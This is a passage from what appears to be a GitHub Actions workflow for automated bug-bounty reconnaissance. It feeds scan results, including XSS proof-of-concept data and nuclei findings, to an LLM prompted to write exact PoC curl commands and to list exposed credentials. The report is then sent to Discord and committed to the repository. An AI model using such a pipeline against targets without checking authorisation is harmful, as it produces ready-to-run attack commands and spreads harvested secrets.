              if xss_data.strip(): signal_parts.append("=== XSS PoCs ===\n" + xss_data)
          
          raw_signal = "\n\n".join(signal_parts)
          
          if not raw_signal.strip():
              nuclei_file = f'{scan_dir}/all_nuclei.json'
              if os.path.exists(nuclei_file):
                  with open(nuclei_file) as f: raw_signal = "=== NUCLEI FINDINGS ===\n" + f.read()[:5000]
              else:
                  with open(out_file, 'w') as f: f.write("No significant findings detected.")
                  sys.exit(0)
          
          # 2. Construct Prompt
          prompt = f"""You are an ELITE Bug Bounty Triager with P1 track record on HackerOne. Analyze CORRELATED SIGNALS.
          TASK: Analyze data and produce ELITE triage report.
          RULES: Focus on exploitable findings, Identify chains, Write EXACT PoC commands, Filter false positives.
          
          TARGET: {domain}
          RAW SIGNAL DATA:
          {raw_signal}
          
          OUTPUT FORMAT:
          ## 🔥 ELITE TRIAGE REPORT
          ### 💀 CRITICAL CHAINS (Highest Value)
          ### 🎯 TOP 3 EXPLOITABLE FINDINGS (Include Exact PoC curl commands)
          ### 🔑 EXPOSED CREDENTIALS
          ### 🗑️ FALSE POSITIVE FILTER
          ### 💰 TOTAL BOUNTY POTENTIAL
          ### 📋 HACKERONE REPORT TEMPLATE (5 lines)"""
          
          # 3. Call OpenRouter with Retry Logic
          url = "https://openrouter.ai/api/v1/chat/completions"
          headers = {"Content-Type": "application/json", "Authorization": f"Bearer {api_key}"}
          payload = json.dumps({
              "model": "anthropic/claude-3.5-sonnet",
              "max_tokens": 6000,
              "temperature": 0.15,
              "messages": [
                  {"role": "system", "content": "Output pure Markdown. Technical precision."},
                  {"role": "user", "content": prompt}
              ]
          }).encode('utf-8')
          
          max_retries = 2
          ai_response = "API Error: Failed after retries"
          
          for attempt in range(max_retries):
              try:
                  req = urllib.request.Request(url, data=payload, headers=headers)
                  with urllib.request.urlopen(req, timeout=180) as response:
                      result = json.loads(response.read().decode('utf-8'))
                      ai_response = result.get('choices', [{}])[0].get('message', {}).get('content', 'Empty Response')
                      break
              except urllib.error.HTTPError as e:
                  error_body = e.read().decode('utf-8')[:500]
                  if attempt < max_retries - 1: time.sleep(5)
                  else: ai_response = f"API HTTP Error {e.code}: {error_body}"
              except Exception as e:
                  if attempt < max_retries - 1: time.sleep(5)
                  else: ai_response = f"API Connection Error: {str(e)}"
          
          with open(out_file, 'w') as f: f.write(ai_response)
          db.close()
          PYEOF "$D" "${{ secrets.OPENROUTER_API_KEY }}"
          
          AI_SHORT=$(cat /tmp/elite/$D/ai/elite_report.md 2>/dev/null | head -c 1000 | tr '\n' ' ')
          echo "AI_ANALYSIS=$AI_SHORT" >> $GITHUB_ENV

      # ═══════════════════════════════════════════════════
      # PHASE 9: REPORTING & NOTIFICATION
      # ═══════════════════════════════════════════════════
      - name: "📊 Export Correlation Database"
        if: always()
        run: |
          D=${{ env.DOMAIN }}
          DB=/tmp/elite/$D/correlation/engine.db
          sqlite3 -json $DB "SELECT * FROM correlated_findings ORDER BY bounty_estimate DESC" > /tmp/elite/$D/correlation/findings.json 2>/dev/null || true
          echo "=== ELITE SUMMARY ===" > /tmp/elite/$D/correlation/summary.txt
          echo "Domain: $D | Hosts: ${{ env.LIVE_HOSTS }} | High-Val: ${{ env.HIGH_VALUE_ASSETS }} | Diffs: ${{ env.DIFFS_FOUND }} | Crit: ${{ env.CORR_CRITICAL }} | Bounty: \$${{ env.CORR_BOUNTY }}" >> /tmp/elite/$D/correlation/summary.txt

      - name: "💾 Upload Complete Artifact"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: "ELITE-${{ env.DOMAIN }}-${{ github.run_number }}"
          path: /tmp/elite/
          retention-days: 60

      - name: "📢 Discord — Elite Summary"
        if: always()
        run: |
          AI_TEXT=$(cat /tmp/elite/${{ env.DOMAIN }}/ai/elite_report.md 2>/dev/null | head -c 2000 || echo "No report")
          COLOR=3066993
          [ "${{ env.CORR_CRITICAL }}" -gt 0 ] && COLOR=15158332
          [ "${{ env.CORR_FINDINGS }}" -gt 0 ] && COLOR=16776960
          
          jq -n \
              --arg domain "${{ env.DOMAIN }}" \
              --arg hosts "${{ env.LIVE_HOSTS || 0 }}" \
              --arg crit "${{ env.CORR_CRITICAL || 0 }}" \
              --arg bounty "${{ env.CORR_BOUNTY || 0 }}" \
              --arg ai "$AI_TEXT" \
              --arg run_url "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
              --argjson color "$COLOR" \
              '{"username":"💀 Elite Triage Engine","embeds":[{"title":("💀 ELITE: "+$domain),"color":$color,"description":$ai,"fields":[{"name":"🌐 Hosts","value":$hosts,"inline":true},{"name":"🚨 Critical","value":$crit,"inline":true},{"name":"💰 Bounty","value":("$"+$bounty),"inline":true},{"name":"📋 Run","value":"[View]("+$run_url+")","inline":false}],"footer":{"text":"ELITE Engine v2.0 • Claude 3.5"},"timestamp":now|todate}]}' | curl -s -X POST "${{ secrets.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true

      - name: "📥 Commit Elite Report"
        run: |
          D=${{ env.DOMAIN }}
          TS=$(date -u +"%Y-%m-%d_%H-%M")
          mkdir -p results/$D
          cp /tmp/elite/$D/ai/elite_report.md "results/$D/ELITE_$TS.md" 2>/dev/null || true
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add results/
          git diff --staged --quiet || git commit -m "💀 ELITE: $D [$TS] | Crit:${{ env.CORR_CRITICAL }} Bounty:\$${{ env.CORR_BOUNTY }}" || true
          git push || true
